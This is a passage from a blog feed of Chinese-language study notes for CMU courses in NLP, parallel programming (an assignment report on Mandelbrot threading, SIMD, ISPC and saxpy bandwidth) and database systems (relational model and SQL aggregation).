        <content type="html"><![CDATA[<h1 id="lec1-介绍与基础">Lec1 介绍与基础</h1><h2 id="词袋模型">词袋模型</h2><p>在自然语言处理中的一种简化表示方法，其中文本（如句子或文档）被表示为<strong>词的袋（多重集合）</strong>，忽略语法甚至单词顺序，但保留<strong>多重性（频率）</strong>。</p><p><strong>优点：</strong></p><ul><li><strong>简单性：</strong> 非常容易理解和实现。</li><li><strong>效率：</strong>对于文档分类或垃圾邮件检测等基本任务计算开销小。</li><li><strong>可解释性：</strong>可以轻松查看哪些单词（特征）对预测最重要。</li></ul><p><strong>缺点：</strong></p><ul><li><strong>上下文丢失：</strong> 忽略单词顺序（例如，“Not good”和“Goodnot”看起来相同）。</li><li><strong>稀疏性与高维度：</strong>类似于独热编码，向量大小随着词汇量的增加而增长，导致“维度诅咒”。</li><li><strong>缺乏语义相似性：</strong>无法捕捉“boat”和“ship”之间的关系。</li></ul><h2 id="独热编码">独热编码</h2><p>定义：将离散值转换为二进制向量，且只有一个位置为1，其他为0。</p><p>缺点：</p><ul><li>简单直接</li><li>每个标记是单一表示</li></ul><p>优点：</p><ul><li>标记的数量意味着向量的维度</li><li>稀疏性，需要更多存储</li><li>无法表示两个不同单词之间的关系</li></ul><h1 id="lec2-学习表示">Lec2 学习表示</h1><h2 id="子词模型例如bpefasttext">子词模型（例如，BPE，FastText）</h2><p><strong>定义：</strong>将单词拆分为更小的单位（子词或字符n-gram）。频繁的单词保持完整，而稀有单词被拆分（例如，“unhappiness”<span class="math inline">\(\rightarrow\)</span> “un”, “happi”,“ness”）。</p><ul><li><p><strong>优点：</strong></p><ul><li>有限的词汇大小 / 处理相同根词</li><li><strong>处理OOV（词汇外）：</strong>可以通过对其子词求和生成从未在训练中见过的单词的嵌入。</li><li><strong>形态丰富性：</strong>对于具有多种词形的语言（如土耳其语或德语）非常有效。</li></ul><p><strong>缺点：</strong></p><ul><li><strong>计算开销：</strong>训练和推理速度较慢，因为模型必须处理每个单词的更多标记。</li><li><strong>过度标记化：</strong>一些单词可能被拆分成太多无意义的片段，失去“整体单词”的语义完整性。</li><li><strong>语言依赖性：</strong>子词拆分的效率在不同语言之间差异显著（例如，英语与中文）。</li></ul></li></ul><h2 id="连续词袋模型">连续词袋模型</h2><p><strong>定义：</strong>基于神经网络的模型（Word2vec），根据周围的<strong>上下文单词</strong>预测<strong>目标中心单词</strong>。</p><p><strong>优点：</strong></p><ul><li><strong>快速训练：</strong>比Skip-gram快得多，因为它每个上下文窗口只进行一次预测。</li><li><strong>对频繁单词更好：</strong>为在数据中频繁出现的单词提供更稳定的表示。</li><li><strong>低维度：</strong>生成稠密的固定大小向量（例如，300维）而不是稀疏向量。</li></ul><p><strong>缺点：</strong></p><ul><li><strong>位置模糊：</strong>它对上下文单词向量进行平均，这意味着它<strong>忽略了窗口中单词的具体顺序</strong>。</li><li><strong>在稀有单词上表现不佳：</strong>由于它对上下文进行平均，稀有单词往往会被频繁的邻居“平滑”或淹没。</li></ul><hr /><h1 id="lec3-语言建模">Lec3 语言建模</h1><p><strong>语言模型（LM）</strong>定义了所有可能的标记序列的概率分布：<spanclass="math inline">\(P(X) = P(x_1, x_2, \dots, x_T)\)</span></p><p><strong>应用：</strong>评分序列（流畅性）、文本生成、条件生成（机器翻译、摘要）、问答、分类、语法纠正。</p><h2 id="自回归语言模型">自回归语言模型</h2><p>将联合概率分解为下一个标记的预测： <span class="math display">\[P(X) = \prod_{t=1}^{T} P(x_t \mid x_{&lt;t})\]</span></p><p>这将序列建模简化为下一个标记建模，输出空间为词汇表。</p><h2 id="二元模型">二元模型</h2><p>仅使用<strong>前一个标记</strong>预测下一个标记：<spanclass="math inline">\(P(X) \approx \prod_{t=1}^{T} P(x_t \midx_{t-1})\)</span></p><p><strong>训练（最大似然估计）：</strong> <span class="math display">\[P(x_t \mid x_{t-1}) = \frac{\text{count}(x_{t-1}, x_t)}{\sum_{x&#39;}\text{count}(x_{t-1}, x&#39;)}\]</span></p><ul><li><strong>优点：</strong>简单、快速，引入核心语言模型概念（最大似然估计、对数空间、自回归生成）</li><li><strong>缺点：</strong>上下文有限（1个标记），没有长距离依赖，没有单词相似性</li></ul><h2 id="训练目标">训练目标</h2><p>目标：<span class="math inline">\(\max_\theta \sum_{x \in D} \logp_\theta(x)\)</span> — 等价于 <span class="math inline">\(\min_\thetaD_{KL}(p^* \parallel p_\theta)\)</span></p><p><strong>对数空间：</strong> 防止下溢，将乘法转化为加法：<spanclass="math inline">\(\log P(X) = \sum_{t} \log P(x_t \midx_{&lt;t})\)</span></p><h2 id="文本生成">文本生成</h2><p>迭代采样：从<code>[S]</code>开始 → 采样 <spanclass="math inline">\(x_t \sim P(x_t \mid x_{&lt;t})\)</span> → 附加 →在<code>[EOS]</code>处停止</p><h2 id="评估指标">评估指标</h2><p><strong>负对数似然：</strong> <span class="math inline">\(\text{NLL}= - \sum_{i,t} \log P(x_t^{(i)} \midx_{&lt;t}^{(i)})\)</span>（越低越好）</p><p><strong>困惑度：</strong> <span class="math inline">\(\text{PPL} =\exp\left(-\frac{1}{T}\sum_{i,t} \log P(x_t^{(i)} \midx_{&lt;t}^{(i)})\right)\)</span> — 测量模型的“困惑”，越低越好</p><h2 id="n-gram模型">N-gram模型</h2><p>基于前 <span class="math inline">\(n-1\)</span>个标记进行条件化：<span class="math inline">\(P(X) \approx\prod_{t=1}^{T} P(x_t \mid x_{t-n+1:t-1})\)</span></p><p><strong>平滑</strong>（加一）：<span class="math inline">\(P(x_t \midc) = \frac{1 + \text{count}(c, x_t)}{|V| + \sum_{x&#39;} \text{count}(c,x&#39;)}\)</span></p><ul><li><strong>优点：</strong> 更长的上下文、快速、可解释、强记忆</li><li><strong>缺点：</strong> 无参数共享，无法处理长距离依赖，随着 <spanclass="math inline">\(n\)</span> 增大词汇爆炸</li></ul><h2id="前馈神经语言模型bengio等2003">前馈神经语言模型（Bengio等，2003）</h2><p>用神经网络替换计数表：词嵌入 → 连接 → 隐藏层 → softmax</p><p><span class="math display">\[P(x_t \mid x_{&lt;t}) = \text{softmax}(W h), \quad L_t = -\log P(x_t\mid x_{&lt;t})\]</span></p><ul><li><strong>优点：</strong>在相似单词/上下文之间共享参数，稠密表示，更好的泛化能力</li><li><strong>缺点：</strong>固定上下文窗口（通过RNN/Transformer解决）</li></ul><h2 id="实际训练">实际训练</h2><ul><li><strong>数据集划分：</strong>训练（拟合参数）/验证（调整超参数）/测试（最终评估，仅使用一次）</li><li><strong>过拟合：</strong> 验证损失增加而训练损失减少 →使用正则化，提前停止</li><li><strong>权重初始化：</strong> Xavier: <span class="math inline">\(W\sim \mathcal{U}\left(-\sqrt{\frac{6}{n_{in}+n_{out}}},\sqrt{\frac{6}{n_{in}+n_{out}}}\right)\)</span></li><li><strong>学习率：</strong> 初期较大（探索）→后期较小（收敛）；预热稳定早期梯度</li><li><strong>批处理：</strong>填充可变长度序列，在前向传播和损失中掩盖填充</li></ul><h2 id="关键要点">关键要点</h2><ul><li>LM = 自回归分解的概率序列建模</li><li>进展：二元模型 → N-gram →神经语言模型（整个过程中的相同最大似然目标）</li><li>细致的评估和实验设置至关重要</li></ul>]]></content>
      
      
      <categories>
          
          <category> CMU 11-711 高级自然语言处理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Natural Language Processing </tag>
            
            <tag> CMU </tag>
            
            <tag> Study Notes </tag>
            
            <tag> 11711 </tag>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>15618 Assignment 1 Report</title>
      <link href="/zh/2026/01/17/15618-Parallel-Programming/15618%20Assignment1%20Report/"/>
      <url>/zh/2026/01/17/15618-Parallel-Programming/15618%20Assignment1%20Report/</url>
      
        <content type="html"><![CDATA[<h1 id="作业-1-探索多核和-simd-并行性报告">15618 作业 1 探索多核和 SIMD并行性报告</h1><h2 id="问题-1使用-pthreads-的并行分形生成">问题 1：使用 Pthreads的并行分形生成</h2><h3 id="加速图">1.1 加速图</h3><p><strong>实现：</strong> 使用水平条带（空间分解）的多线程 Mandelbrot生成。每个线程<u>处理连续的行</u>。对于行数（900）不能被线程数整除的情况，前 (900 % T)个线程被 <u>分配一行额外的行</u> 以确保所有行都被处理。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260116145929648.png" alt="image-20260116145929648" style="zoom: 25%;" /></p><blockquote><p>注意：16 个线程通过超线程技术使用相同的 8 个物理核心。</p></blockquote><p><strong><u>加速并不是线性的。</u></strong> 在 8个核心下，我们仅实现了 <strong>3.97× 的加速</strong>（49.6%的效率），而不是理想的 8×。</p><p><u><strong>假设：负载不平衡</strong>：</u></p><p>水平条带策略造成了严重的负载不平衡，因为：</p><ul><li><strong>顶部/底部行</strong>：远离 Mandelbrot 边界的点快速发散（约10-50 次迭代）</li><li><strong>中间行</strong>：靠近边界的点需要最大迭代次数（256）</li><li>结果：分配给中间行的线程工作时间显著更长</li></ul><p>由于总时间等于最慢线程的时间，不平衡的工作显著降低了加速。</p><blockquote><p>关键观察：</p><p>从 2 个线程（98%）到 4个线程（60%）的效率急剧下降，确认负载不平衡是主要的性能瓶颈，而不是硬件限制。</p></blockquote><h3 id="每线程计时测量">1.2 每线程计时测量</h3><p>为了验证第 1.1 节的负载不平衡假设，我在 workerThreadStart()的开始和结束处添加了计时测量，使用 CycleTimer::currentSeconds()。</p><figure><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260116151418165.png"alt="image-20260116151418165" /><figcaption aria-hidden="true">image-20260116151418165</figcaption></figure><p><strong><u>分析：负载不平衡确认</u></strong></p><p>计时可视化清楚地显示了<strong>严重的负载不平衡</strong>。颜色渐变揭示了问题：处理顶部和底部行的线程（绿色条）快速完成，而处理中间行的线程（红色条）则需要显著更长的时间。这个模式直接对应于Mandelbrot集的计算结构——边界区域需要最大迭代次数，而外部区域快速发散。</p><p>对于 4个线程，这种不平衡意味着两个线程在大部分执行时间内处于空闲状态，而另外两个线程继续工作，浪费了一半的可用CPU 能力。使用 8个线程时，问题更严重：大多数线程早早完成并等待少数几个处理昂贵边界行的线程。这种不均匀分布解释了为什么我们在8 个核心下仅实现了 3.97× 的加速，而不是理想的8×——执行时间被最慢线程所瓶颈，而不是平均工作负载。</p><h3 id="提高加速">1.3 提高加速</h3><p><strong>策略：交错行分配</strong></p><p>我实现了交错分配，而不是水平条带（每个线程处理连续行），其中线程<em>i</em> 处理行 <em>i</em>, <em>i+T</em>, <em>i+2T</em>,<em>i+3T</em>, …，其中 <em>T</em> 是线程总数。</p><p>这种简单的静态分配确保每个线程处理一组计算上便宜的行（图像顶部/底部）和昂贵的行（靠近Mandelbrot 边界），自动平衡工作负载而无需任何同步。</p><table><thead><tr class="header"><th style="text-align: left;">线程数</th><th style="text-align: left;">视图 1 加速</th><th style="text-align: left;">视图 2 加速</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">4</td><td style="text-align: left;">3.84×</td><td style="text-align: left;">3.82×</td></tr><tr class="even"><td style="text-align: left;">8</td><td style="text-align: left;"><strong>7.56×</strong></td><td style="text-align: left;"><strong>7.53×</strong></td></tr><tr class="odd"><td style="text-align: left;">16</td><td style="text-align: left;">7.61×</td><td style="text-align: left;">7.35×</td></tr></tbody></table><p><strong><u>扩展行为分析：</u></strong></p><p><strong>4→8 线程（4→8 核心）：</strong>加速几乎翻倍，展示了出色的扩展性，因为每个额外的线程都在一个专用的物理核心上运行，拥有完整的计算资源。</p><p><strong>8→16 线程（8 核心与超线程）：</strong>性能提升有限甚至下降（视图 2）。由于这两种配置共享相同的 8个物理核心，16 个线程在执行单元和缓存上通过超线程竞争。对于计算密集型的Mandelbrot 工作负载，内存停顿最小，超线程几乎没有好处。</p><h2 id="问题-2使用-simd-内在向量化代码"><strong>问题 2：使用 SIMD内在向量化代码</strong></h2><h3 id="clampedexpvector">2.1 clampedExpVector</h3><p>实现遵循平方取幂算法，并每个向量指令并行处理 W 个元素。</p><p><strong>关键实现细节：</strong></p><ol type="1"><li><strong>循环结构</strong>：以 VECTOR_WIDTH为单位处理数组，每次迭代处理一个元素向量</li><li><strong>掩码管理</strong>：使用 maskActive 跟踪哪些通道的指数仍大于0，当所有通道完成时终止循环</li><li><strong>边界处理</strong>：使用 _cmu418_init_ones(count)动态创建掩码，以正确处理 N 不是 W 的倍数的情况</li><li><strong>结果限制</strong>：向量化限制逻辑，以限制超过 4.18的结果</li></ol><p><strong>正确性</strong>：通过了所有测试用例，包括非对齐数组大小（例如，N=3，N=10，N=100）</p><h3 id="向量宽度扫频实验">2.2 向量宽度扫频实验</h3><p><strong>实验设置</strong>：运行 ./vrun -s 10000，VECTOR_WIDTH ∈ {2,4, 8, 16, 32}</p><figure><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260116181624182.png"alt="image-20260116181624182" /><figcaption aria-hidden="true">image-20260116181624182</figcaption></figure><ol type="1"><li><p><strong>向量利用率分析</strong></p><p><strong>观察</strong>：在所有向量宽度下，向量利用率保持高水平（88.51%-89.45%），随着W 从 2 增加到 32，仅 <u>下降 0.94%</u>。这表明<u>对向量宽度的低敏感性</u>。</p><p>这是因为迭代次数与 log₂(指数) 成正比，这意味着指数之间的 10倍差异（例如，100 与 1000）仅导致 ~3 次额外迭代。由于向量指令必须<u>等待最慢的通道完成</u>，每个向量的迭代次数由最大迭代次数的元素决定。这种低方差<u>确保向量内的元素在相似时间内完成，最小化空闲通道，无论向量宽度如何</u>。</p></li><li><p><strong>向量指令数量分析</strong></p><p><strong>观察</strong>：总向量指令从 286,614（W=2）减少到18,471（W=32），<u>每次向量宽度翻倍大约减半</u>。测得的指令数量紧密跟随理论O(N/W) 曲线（红色虚线），确认接近理想扩展。</p><p>总指令数量 <u>由外循环运行的次数决定</u>。当向量宽度翻倍（例如，W=4到W=8）时，每个向量指令可以处理更多元素，因此外循环只需运行一半的次数。由于每次循环迭代内部的工作保持不变，<u>翻倍W 直接减半总指令</u>。这种 <strong>93.6% 的减少</strong> 从 W=2 到 W=32证明了向量化提供了预期的线性加速。</p></li></ol><h3 id="arraysumvector">2.3 <strong>arraySumVector</strong></h3><p>实现了一个树归约算法，达到 <strong>O(N/W + log₂W)</strong>的跨度复杂度：</p><p><strong>算法：</strong></p><ol type="1"><li><strong>第一阶段 -向量累加（O(N/W)）</strong>：使用向量加法将所有数组元素相加到一个单一的向量寄存器中</li><li><strong>第二阶段 - 树归约（O(log₂W)）</strong>：在 log₂W 轮中使用hadd 和交错操作将 W 个元素归约为一个标量</li></ol><p><strong>正确性</strong>：通过了 W = 2, 4, 8, 16 的所有测试。</p><h2 id="问题-3使用-ispc-的并行分形生成">问题 3：使用 ISPC的并行分形生成</h2><h3 id="第-1-部分ispc-simd-并行化分析">3.1 第 1 部分：ISPC SIMD并行化分析</h3><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/Figure_1.png" alt="Figure_1" style="zoom:70%;" /></p><h4 id="x-理论最大加速">8x 理论最大加速</h4><p>ISPC 编译器配置为发出 8 路 AVX2 SIMD 指令，可以 <u>同时处理 8个浮点值</u>。因此，理论最大加速为<strong>8x</strong>，与串行实现相比。</p><h4 id="simd-分歧停顿">SIMD 分歧（停顿）</h4><p>观察到的平均加速为 <strong>4.48x</strong>，仅为理论 8x 最大值的56%，因为 <u>不同像素需要不同数量的迭代</u> 来确定它们是否在 Mandelbrot集中——在 SIMD 中同时处理 8个像素时，有些快速完成，而其他则需要更长时间，迫使<u>所有通道等待最慢的一个</u>，这浪费了空闲通道的计算。</p><h4 id="不同视图的性能变化">不同视图的性能变化</h4><p>不同视图的加速范围从 <strong>4.01x 到 4.88x</strong>（视图 6：最佳4.88x，视图 5：最差 4.01x）。具有 <u>复杂分形边界的视图</u>其相邻像素的迭代次数差异很大，导致更多 SIMD 通道处于空闲状态，而具有<u>平滑区域的视图</u> 其像素在相似时间内完成，从而减少了浪费的计算。</p><h3 id="第-2-部分ispc-任务">3.2 第 2 部分：ISPC 任务</h3><h4 id="使用-tasks-的加速">使用 –tasks 的加速</h4><table><thead><tr class="header"><th style="text-align: left;">实现</th><th style="text-align: left;">时间 (ms)</th><th style="text-align: left;">与串行的加速</th><th style="text-align: left;">与 ISPC 的加速</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">串行</td><td style="text-align: left;">176.369</td><td style="text-align: left;">1.00x</td><td style="text-align: left;">-</td></tr><tr class="even"><td style="text-align: left;">ISPC（仅 SIMD）</td><td style="text-align: left;">37.019</td><td style="text-align: left;">4.76x</td><td style="text-align: left;">1.00x</td></tr><tr class="odd"><td style="text-align: left;">ISPC + 任务（2 个任务）</td><td style="text-align: left;">18.721</td><td style="text-align: left;"><strong>9.42x</strong></td><td style="text-align: left;"><strong>1.98x</strong></td></tr></tbody></table><p>来自任务的 2 倍提升是合理的，因为当前实现仅创建 2 个任务，仅利用了 8个核心中的 2 个。通过增加任务数量，性能可以显著提高。</p><h4 id="找到最佳任务数量">找到最佳任务数量</h4><figure><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260116231307425.png"alt="image-20260116231307425" /><figcaption aria-hidden="true">image-20260116231307425</figcaption></figure><p><u><strong>最佳任务数量为 16</strong></u></p><p>系统有 <strong>8 个物理核心，支持超线程</strong>，允许 <strong>16个硬件线程</strong> 同时运行。使用 16 个任务实现最佳性能（<strong>32.49×加速</strong>），原因如下：</p><ol type="1"><li><strong>匹配硬件容量</strong>：16 个任务充分利用所有 16个硬件线程，使所有执行单元保持忙碌。</li><li><strong>更好的负载平衡</strong>：Mandelbrot计算的工作负载不均匀——分形边界需要比实心区域多得多的迭代。仅使用 2个任务时，一个任务可能会在重负载区域卡住，而另一个则早早完成。使用 16个较小的任务，工作在核心之间分配得更均匀。</li><li><strong>超过 16 的收益递减</strong>：使用 32 个任务（32.86×）相较于16个任务的提升有限，因为任务调度开销增加，而负载平衡的好处趋于平稳。</li></ol><h4 id="pthread-与-ispc-任务的对比">Pthread 与 ISPC 任务的对比</h4><p>Pthreads 是操作系统级线程，开销较大。启动 10,000个线程可能会由于过多的内存消耗和上下文切换而崩溃或严重减慢系统。</p><p>相比之下，ISPC任务是轻量级的逻辑单元。运行时将它们映射到一个小的固定线程池（通常与 CPU核心数量相匹配）。启动 10,000个任务是高效的，因为它们通过任务队列进行调度。</p><p><strong>关键区别</strong>是 Pthreads适用于粗粒度并行（任务少，开销高），而 ISPC任务使得细粒度数据并行（任务多，开销低）。这使得 ISPC非常适合像像素级处理这样的 SPMD 风格操作。</p><h2 id="问题-4迭代平方根"><strong>问题 4：迭代平方根</strong></h2><h3 id="加速">4.1 加速</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">串行：682.707 ms</span><br><span class="line">ISPC（无任务）：145.532 ms</span><br><span class="line">ISPC（有任务）：20.079 ms</span><br><span class="line"></span><br><span class="line">SIMD 加速：4.69x</span><br><span class="line">多核加速：7.25x (145.532/20.079)</span><br><span class="line">总加速：34.00x</span><br></pre></td></tr></table></figure><h3 id="initgood">4.2 initGood</h3><p><strong>实现：</strong> 将所有值设置为 <code>2.999f</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">串行：1698.132 ms</span><br><span class="line">ISPC（无任务）：297.302 ms</span><br><span class="line">ISPC（有任务）：33.920 ms</span><br><span class="line"></span><br><span class="line">SIMD 加速：5.71x</span><br><span class="line">多核加速：8.76x (297.302/33.920)</span><br><span class="line">总加速：50.06x</span><br></pre></td></tr></table></figure><p>这个选择通过以下方式最大化加速：</p><ul><li><p><strong>完美的 SIMD 效率</strong>：所有元素<u>在相同的迭代中收敛</u>，消除了通道分歧。每个 SIMD通道执行相同的工作量，并且 <u>同时完成，没有空闲等待。</u> SIMD 加速<u>从 4.69x（随机）提高到 5.71x</u>。</p><p><strong>超线程下的最大多核收益</strong>：均匀的重负载使得多核扩展表现出色。<u>多核加速达到8.76x，超过基线 7.25x</u>。这证明了作业中提到的<u>超线程效应</u>——当所有线程执行相同的重负载时，超线程可以提供超出物理核心数量的额外性能。</p></li></ul><h3 id="initbad">4.3 initBad</h3><p><strong>实现：</strong> 每 8 个元素交替使用 <code>2.999f</code> 和<code>1.0f</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">串行：234.384 ms</span><br><span class="line">ISPC（无任务）：297.430 ms</span><br><span class="line">ISPC（有任务）：33.926 ms</span><br><span class="line"></span><br><span class="line">SIMD 加速：0.79x</span><br><span class="line">多核加速：8.77x (297.430/33.926)</span><br><span class="line">总加速：6.91x</span><br></pre></td></tr></table></figure><p><strong>值的选择</strong>：<code>2.999f</code> 需要更多的迭代，而<code>1.0f</code> 需要 ~0 次迭代（与初始猜测相符）。这在每个 SIMD幫中造成了最大迭代次数的分歧。</p><p><strong>SIMD 性能</strong>：这种模式在每个 SIMD 向量内造成了<u>最大工作分歧</u>（帮大小 = 8），每个向量有 1 个慢元素和 7个快元素。SIMD在锁步操作中，所有通道必须等待最慢的通道，<u>性能低于串行执行（0.79x）</u>。</p><p><strong>多核性能</strong>：多核加速 <u>仍然非常高，达到 8.77x</u>，与initGood（8.76x）几乎相同。<u>该模式在数组中均匀重复</u>（每第 8个元素是慢的），确保 <u>尽管单个向量内存在严重的 SIMD效率低下，但线程之间的工作负载分配仍然均衡</u>。</p><h2 id="问题-5blas-saxpy"><strong>问题 5：BLAS</strong> saxpy</h2><h3 id="saxpy-性能分析">5.1 saxpy 性能分析</h3><table style="width:100%;"><colgroup><col style="width: 24%" /><col style="width: 15%" /><col style="width: 21%" /><col style="width: 24%" /><col style="width: 14%" /></colgroup><thead><tr class="header"><th>版本</th><th>时间 (ms)</th><th>带宽 (GB/s)</th><th>性能 (GFLOPS)</th><th>加速</th></tr></thead><tbody><tr class="odd"><td>串行</td><td>11.356</td><td>26.243</td><td>1.761</td><td>1.00x</td></tr><tr class="even"><td>流式</td><td>11.242</td><td>26.509</td><td>1.779</td><td>1.01x</td></tr><tr class="odd"><td><strong>ISPC</strong></td><td><strong>11.315</strong></td><td><strong>26.339</strong></td><td><strong>1.768</strong></td><td><strong>1.00x</strong></td></tr><tr class="even"><td><strong>任务 ISPC</strong></td><td><strong>11.133</strong></td><td><strong>26.768</strong></td><td><strong>1.796</strong></td><td><strong>1.02x</strong></td></tr></tbody></table><p>工作负载是 <strong><u>受内存带宽限制</u></strong>。Saxpy访问大量数据，但仅执行 2次浮点运算。处理器在等待内存时花费的时间远远超过计算时间。尽管 saxpy可以轻松并行化，<u>ISPC 和多核执行提供的加速仅约为1.00x</u>。所有实现的带宽约为 26-27 GB/s，表明我们已经<u>达到了内存带宽限制</u>。</p><p><u><strong>该程序无法通过并行化单独显著改善。</strong></u>增加更多核心或 SIMD通道在串行执行已经最大化内存带宽时并没有帮助。潜在的改进需要<u>减少内存流量</u>（例如，使用非临时存储结果向量以避免缓存污染，将带宽从4N 降低到 3N 个浮点数）或 <u>升级到更高带宽的内存硬件</u>。</p><h3 id="额外学分为什么是-4n-而不是-3n">5.2 额外学分：为什么是 4N 而不是3N？</h3><p>我认为这是因为缓存的行为。现代 CPU使用写分配缓存策略，这意味着写操作必须首先将目标数据加载到缓存中，然后才能修改。这是为了确保缓存一致性和局部性优化。因此，额外的N 个浮点数是 <u>读取结果缓存行</u>。</p><h3 id="额外学分还有哪些因素可能影响">5.3额外学分：还有哪些因素可能影响？</h3><p>观察到的 26-27 GB/s 带宽代表了 DDR4内存系统的典型效率。观察到的带宽与理论峰值之间的差距是由于：</p><ul><li><strong>DRAM 时序开销</strong>：DDR4 在操作之间需要强制延迟（CAS延迟、行预充电时间、刷新周期），在此期间内存总线处于空闲状态。这些时序限制通常将有效带宽降低到理论峰值的60-70%。</li><li><strong>内存控制器效率</strong>：银行冲突、通道仲裁和内存控制器中的命令调度增加了额外的开销。</li></ul><h3 id="额外学分非临时存储优化">5.4 额外学分：非临时存储优化</h3><p><strong>实现：</strong> 使用 SSE 内在修改 saxpyStreaming()，使用<code>_mm_stream_ps</code> 绕过缓存。</p><table style="width:100%;"><colgroup><col style="width: 24%" /><col style="width: 15%" /><col style="width: 21%" /><col style="width: 24%" /><col style="width: 14%" /></colgroup><thead><tr class="header"><th>版本</th><th>时间 (ms)</th><th>带宽 (GB/s)</th><th>性能 (GFLOPS)</th><th>加速</th></tr></thead><tbody><tr class="odd"><td>串行</td><td>11.124</td><td>26.791</td><td>1.798</td><td>1.00x</td></tr><tr class="even"><td><strong>流式</strong></td><td><strong>8.138</strong></td><td><strong>36.623</strong></td><td><strong>2.458</strong></td><td><strong>1.37x</strong></td></tr><tr class="odd"><td>ISPC</td><td>11.201</td><td>26.608</td><td>1.786</td><td>0.99x</td></tr><tr class="even"><td>任务 ISPC</td><td>11.125</td><td>26.789</td><td>1.798</td><td>1.00x</td></tr></tbody></table><p>非临时存储将内存流量从 4N 降低到 3N 个浮点数，实现了 1.37x的加速和带宽从 26.8 GB/s 提升到 36.6 GB/s。</p>]]></content>
      
      
      <categories>
          
          <category> CMU 15-618 并行编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMU </tag>
            
            <tag> Parallel Programming </tag>
            
            <tag> 15618 </tag>
            
            <tag> Assignment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>15645 Database Systems Lecture Notes</title>
      <link href="/zh/2026/01/16/15645-Database-Systems/15645-Database-Systems-relational-model-and-SQL/"/>
      <url>/zh/2026/01/16/15645-Database-Systems/15645-Database-Systems-relational-model-and-SQL/</url>
      
        <content type="html"><![CDATA[<h1 id="lec-1-关系模型">Lec 1 关系模型</h1><h2 id="术语">术语</h2><ul><li><p><u><strong>数据库管理系统</strong></u> (DBMS)是一种软件，允许应用程序在数据库中存储和分析信息，并应支持<u>根据某种数据模型定义、创建、查询、更新和管理数据库</u>。</p></li><li><p><strong><u>数据模型</u></strong>是描述数据库中数据的<strong>概念</strong>集合。（例如，关系或文档）</p></li><li><p><strong><u>模式</u></strong>是使用给定数据模型描述特定数据集合的描述。（例如，表结构设计）</p></li><li><p><strong><u>关系</u></strong>是一个无序集合，包含表示实体的属性关系。（例如，表或容器）</p></li><li><p><strong><u>元组</u></strong>是关系中一组属性值（即其<strong>域</strong>）。（例如，表中的数据条目）</p></li></ul><blockquote><p>DBMS 可以通过身份列自动生成唯一主键：</p><ul><li><p><strong>IDENTITY</strong> (SQL 标准)</p></li><li><p><strong>SEQUENCE</strong> (PostgreSQL / Oracle)<strong>全局，其他与列绑定</strong></p></li><li><p><strong>AUTO_INCREMENT</strong> (MySQL)</p></li></ul></blockquote><h2 id="关系代数">关系代数</h2><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260115225646566.png" alt="image-20260115225646566" style="zoom:30%;" /></p><h1 id="lec-2-现代-sql">Lec 2 现代 SQL</h1><p>SQL 基于袋（重复项，如多站点），而不是集合（无重复项）。</p><blockquote><p>术语：</p><ul><li>数据操作语言 (DML)</li><li>数据定义语言 (DDL)</li><li>数据控制语言 (DCL)</li></ul></blockquote><p>执行顺序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">FROM / JOIN</span><br><span class="line">→ WHERE</span><br><span class="line">→ GROUP BY</span><br><span class="line">→ 聚合函数（AVG / COUNT / …）</span><br><span class="line">→ HAVING</span><br><span class="line">→ SELECT</span><br><span class="line">→ ORDER BY</span><br><span class="line">→ LIMIT</span><br></pre></td></tr></table></figure><h2 id="聚合">聚合</h2><p>从一组元组中返回单个值的函数：</p><ul><li><strong>AVG(col)</strong>→ 返回 col 的平均值。</li><li><strong>MIN(col)</strong>→ 返回 col 的最小值。</li><li><strong>MAX(col)</strong>→ 返回 col 的最大值。</li><li><strong>SUM(col)</strong>→ 返回 col 中值的总和。</li><li><strong>COUNT(col)</strong>→ 返回 col 的值的数量。</li></ul><blockquote><p>COUNT(*) 计算行数，COUNT(1) 每行计算一个常量值（永远不为NULL），因此它们是等价的；只有 COUNT(column) 可能不同，因为它会忽略NULL。</p></blockquote><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260117180637261.png" alt="image-20260117180637261" style="zoom:30%;" /></p><p>在上图中，AVG(s.gpa) 只有一个单一值，但 e.cid可能有多个值，因此数据库不知道如何为该列选择一个值，我们应该使用ANY_VALUE() 明确告诉数据库如何选择。</p><h2 id="分组">分组</h2><p>将元组投影到子集，并对每个子集计算聚合。</p><blockquote><p>分组在 FROM/JOIN/WHERE 之后，但在聚合函数之前发生。</p></blockquote><h2 id="分组集">分组集</h2><p>在单个查询中指定多个分组，而不是使用 <strong>UNION ALL</strong>来组合多个单独的 <strong>GROUP BY</strong> 查询的结果。</p><h2 id="过滤">过滤</h2><p>对结果进行资格认证<strong><u>聚合计算前</u></strong>。聚合组成员资格资格。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260117182334070.png" alt="image-20260117182334070" style="zoom:40%;" /></p><h2 id="having">HAVING</h2><p>对结果进行过滤 